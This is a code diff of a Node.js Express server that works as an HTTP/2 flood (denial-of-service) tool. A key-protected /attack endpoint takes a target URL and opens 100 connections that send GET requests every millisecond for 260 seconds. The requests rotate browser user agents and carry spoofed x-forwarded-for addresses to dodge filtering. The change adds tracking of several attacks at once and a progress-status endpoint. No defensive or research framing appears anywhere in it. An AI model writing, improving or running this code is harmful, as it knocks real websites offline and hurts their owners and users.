@@ -7,7 +7,7 @@ const app = express();
 const bodyParser = require('body-parser');
 app.use(bodyParser.json());
 
-let C = false;
+let attacks = new Map();
 let currentPort = Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;
 
 const L = () => {
@@ -43,10 +43,9 @@ const N = async () => {
   }
 };
 
-const A = async (target, duration) => {
-  const methods = ['GET'];
-  const userAgents = [
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+const generateUserAgents = () => {
+  return [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/115.0',
   'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
@@ -124,72 +123,79 @@ const A = async (target, duration) => {
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6) AppleWebKit/531.4 (KHTML, like Gecko) Version/4.0.3 Safari/531.4',
 ];
+};
 
-  console.log(`${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
-  console.log(`${'⏳'.cyan} ${'[ DURASI ] :'.bold} ${duration.toString().yellow} detik\n`);
-
+const A = async (target, duration, attackId) => {
   const startTime = Date.now();
-  const targetURL = new URL(target);
+  const userAgents = generateUserAgents();
+  
+  attacks.set(attackId, {
+    startTime,
+    duration,
+    completed: false
+  });
 
   const flood = () => {
-    try {
-      const client = http2.connect(target, { rejectUnauthorized: false });
-      client.on('error', () => {});
-      client.on('connect', () => {
-        while (Date.now() - startTime < duration * 1000) {
-          const req = client.request({
-            ':method': methods[Math.floor(Math.random() * methods.length)],
-            ':path': '/',
-            'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-            'accept-language': 'en-US,en;q=0.9',
-            'x-forwarded-for': `${crypto.randomInt(1,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(1,255)}`,
-            'cache-control': 'no-cache'
-          });
-          req.on('response', () => req.close());
-          req.end();
-        }
+    const client = http2.connect(target, { rejectUnauthorized: false });
+    client.on('error', () => {});
+    
+    const interval = setInterval(() => {
+      if (Date.now() - startTime > duration * 1000) {
+        clearInterval(interval);
         client.close();
+        attacks.set(attackId, { ...attacks.get(attackId), completed: true });
+        return;
+      }
+      
+      const req = client.request({
+        ':method': 'GET',
+        ':path': '/',
+        'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+        'x-forwarded-for': `${crypto.randomInt(1,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(1,255)}`
       });
-    } catch {}
+      req.on('response', () => req.close());
+      req.end();
+    }, 1);
   };
 
-  const workers = Array.from({ length: 100 }, () => new Promise(resolve => {
-    flood();
-    resolve();
-  }));
-
-  await Promise.all(workers);
-  console.log(`\n${'✓'.green} ${'[ SUCCESS ]'.bold}\n`);
+  Array.from({ length: 100 }).forEach(flood);
 };
 
 app.post('/attack', async (req, res) => {
-  if (C) return res.status(429).json({ error: '[ PROSES ]' });
-
   const { target, apiKey } = req.body;
-  if (apiKey !== 'TERMUX_KEY') return res.status(403).json({ error: 'Akses tidak valid' });
+  if (apiKey !== 'TERMUX_KEY') return res.status(403).json({ error: 'Invalid key' });
 
   try {
     new URL(target);
-    C = true;
-    A(target, 260);
-    res.status(200).json({ status: '[ START ]', target });
+    const attackId = crypto.randomBytes(16).toString('hex');
+    A(target, 260, attackId);
+    res.json({ 
+      status: 'ATTACKING', 
+      attackId,
+      duration: 260 
+    });
   } catch (e) {
-    res.status(400).json({ error: '[ URL INVALID! ]' });
+    res.status(400).json({ error: 'Invalid URL' });
   }
 });
 
-app.get('/info', async (req, res) => {
-  try {
-    const response = await fetch(`http://ip-api.com/json/${new URL(req.query.target).hostname}`);
-    const data = await response.json();
-    res.json(data);
-  } catch (e) {
-    res.status(500).json({ error: '[ GAGAL MENCARI INFORMASI ]' });
-  }
+app.get('/status/:attackId', (req, res) => {
+  const attack = attacks.get(req.params.attackId);
+  if (!attack) return res.status(404).json({ error: 'Attack not found' });
+  
+  const progress = Math.min(
+    ((Date.now() - attack.startTime) / (attack.duration * 1000)) * 100,
+    100
+  );
+  
+  res.json({
+    progress: Number(progress.toFixed(2)),
+    completed: attack.completed
+  });
 });
 
 L();
 app.listen(currentPort, () => {
-  console.log(`${'[ RUNING ] :'.bold} ${currentPort.toString().yellow}`);
+  console.log(`${'[ RUNNING ] :'.bold} ${currentPort.toString().yellow}`);
   N();
 });
